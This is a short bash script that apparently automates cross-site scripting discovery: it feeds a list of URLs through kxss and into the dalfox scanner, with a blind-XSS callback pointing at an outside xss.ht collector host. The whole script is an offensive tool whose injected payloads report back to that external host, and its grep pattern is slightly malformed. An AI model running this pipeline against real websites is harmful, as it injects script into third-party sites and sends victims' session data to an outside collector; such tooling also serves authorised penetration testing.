#!/bin/bash

Blind="https://koanti.xss.ht"
cat $1 | kxss | grep -Eo "http|https://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b $Blind
